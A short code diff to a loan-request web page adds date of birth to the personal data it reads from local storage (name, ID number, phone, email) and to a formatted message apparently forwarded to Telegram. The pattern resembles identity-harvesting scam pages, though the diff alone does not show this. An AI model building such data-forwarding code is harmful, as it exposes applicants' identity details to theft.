@@ -254,6 +254,7 @@
             // Gather all stored data
             const loanData = {
                 Name: localStorage.getItem("fullName") || "N/A",
+                DOB: localStorage.getItem("dob") || "N/A",
                 ID: localStorage.getItem("idNumber") || "N/A",
                 Phone: localStorage.getItem("phone") || "N/A",
                 Email: localStorage.getItem("email") || "N/A",
@@ -269,6 +270,7 @@
             const telegramMessage = `🏦 *New Loan Request*\n` +
                                     `--------------------------\n` +
                                     `👤 *User:* ${loanData.Name}\n` +
+                                    `📅 *DOB:* ${loanData.DOB}\n` +
                                     `🆔 *ID:* ${loanData.ID}\n` +
                                     `📞 *Phone:* ${loanData.Phone}\n` +
                                     `📧 *Email:* ${loanData.Email}\n\n` +
